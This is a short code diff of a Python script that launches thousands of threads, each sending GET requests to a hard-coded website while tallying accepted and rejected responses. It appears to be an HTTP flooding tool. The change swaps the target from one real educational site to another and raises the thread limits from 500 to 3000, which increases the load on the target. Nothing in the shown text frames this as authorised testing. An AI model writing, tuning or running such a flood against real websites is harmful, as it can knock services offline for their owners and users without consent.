@@ -14,12 +14,13 @@ def run(i):
 	global accept
 	global reject
 	logger.debug("Sending request : " + str(i))
-	res=requests.get('https://hcst.edu.in/')
-	logger.debug(str(i) + "  " + str(res.status_code) + " " + str(res.elapsed))
-	if res.ok:
+	try:
+		res=requests.get('http://jksacademy.com/')
 		accept = accept + 1
-	else:
-	    reject = reject + 1
+		logger.debug(str(i) + "  " + str(res.status_code) + " " + str(res.elapsed))
+	except:
+		reject = reject + 1
+
 	logger.info("Accepted : " + str(accept) + "   Rejected : " + str(reject))
 
 if __name__ == "__main__":
@@ -34,7 +35,7 @@ if __name__ == "__main__":
 		tt = threading.Thread(target=run,args=(i,))
 		tt.start()
 		threads.append(tt)
-		if i%350==0 or threading.active_count()>500:
+		if i%3000==0 or threading.active_count()>3000:
 			time.sleep(10)
 
 	for i in range(n):
